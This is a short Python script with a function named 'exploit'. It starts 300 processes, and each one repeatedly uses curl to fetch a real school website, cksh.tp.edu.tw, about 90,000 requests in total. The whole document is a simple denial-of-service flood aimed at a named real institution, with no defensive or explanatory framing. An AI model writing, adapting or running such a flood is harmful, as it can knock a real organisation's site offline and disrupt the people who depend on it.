import multiprocessing
import os
import time

def exploit(x):
    for i in range(300):
        print("connect!")
        os.system('curl -o log -s https://www.cksh.tp.edu.tw')
    

num_processes = 300  # 設定要創建的進程數量
processes = []

for i in range(num_processes):
    process = multiprocessing.Process(target=exploit, args=(i,))
    processes.append(process)
    process.start()

for process in processes:
    process.join()

print("END")